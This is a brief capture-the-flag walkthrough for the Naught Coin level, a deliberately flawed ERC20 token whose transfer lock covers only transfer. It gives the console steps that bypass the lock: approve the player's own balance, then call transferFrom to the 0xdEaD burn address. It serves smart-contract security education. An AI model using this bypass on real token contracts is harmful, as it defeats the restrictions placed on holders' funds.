# Naught Coin

the Naught Coin inherited from Openzeppelin's ERC20

```solidity
import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';
```

but only implements `transfer`

get balance

```solidity
const balance = await contract.balanceOf(player)
```

approve player to transfer the coin

```solidity
await contract.approve(player, await contract.balanceOf(player));
```

transfer to burn address

```solidity
await contract.transferFrom(player, '0x000000000000000000000000000000000000dEaD', balance);
```

check the balance

```solidity
(await contract.balanceOf(player)).toString();
```
